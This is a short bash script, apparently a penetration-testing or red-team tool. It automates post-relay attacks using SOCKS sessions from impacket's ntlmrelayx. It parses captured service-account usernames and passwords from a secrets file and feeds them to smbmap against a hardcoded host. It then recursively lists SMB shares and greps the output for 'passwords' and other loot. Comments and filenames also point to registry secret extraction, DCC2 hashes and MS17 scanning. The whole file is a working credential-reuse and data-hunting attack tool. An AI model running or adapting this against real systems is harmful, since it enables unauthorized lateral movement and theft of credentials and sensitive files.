#!/usr/bin/bash
#
# This script will allow you to automate recursive
# share listings and registry extr action through socks collected with
# impacket/examples/ntlmrelayx
#
# sockparse.sh Version: .00
# Author: auth0r1
# Date: 11/11/19

##TODO##
##
## cat out a random w/ signing disabled and push to the host variable below
## it's hardcoded for testing as is.
##
## grep statements to find more loot
##
## build in logic to recursively list more sharse if credentials work
########
echo
echo -e "\e[1;33mAuto svcChk  || passwords in share drives; secrets in registry\e[0m"
echo

echo -e "\e[1;33m\e[0m"
echo -e "\e[1;33mChecking SVC Credentials\e[0m"


cat sockslist | awk '{print $3}' | cut -d'/' -f1 > domain.log
dmain1="$(cat domain.log)"
echo "Domain: $dmain1"
sed -i '/\[[*]\]/d' secrets.svc.parse
svcusr="$(cat secrets.svc.parse | cut -d '\' -f2 | cut -d ':' -f1)"
echo "user: $svcusr"
pwd="$(cat secrets.svc.parse | cut -d ":" -f 2)"
echo "pass: $pwd"
echo "host: 192.168.1.2"
echo ""
sleep 2
svccheck="smbmap -d "$dmain1" -u "$svcusr" -p "$pwd" -H 192.168.1.2"
$svccheck | tee $svcusr.logincheck

echo -e "\e[1;33m\e[0m"
echo -e "\e[1;33mlooking for loot\e[0m"
svccheck="smbmap -r -d "$dmain1" -u "$svcusr" -p "$pwd" -H 192.168.1.2"
$svccheck > $svcusr.logincheck.recursive
grep -e "passwords" -e "READ" $svcusr.logincheck.recursive

#moving my unorganized files#
mv secrets.svc.parse domain.log signing.disabled.log secret.dcc2.parse secret.svc.parse socks_secrets socks_smb socks_smb.log dcc2.hashcat ms17.log linecount eroyer.logincheck eroyer.logincheck.recursive $dmain1
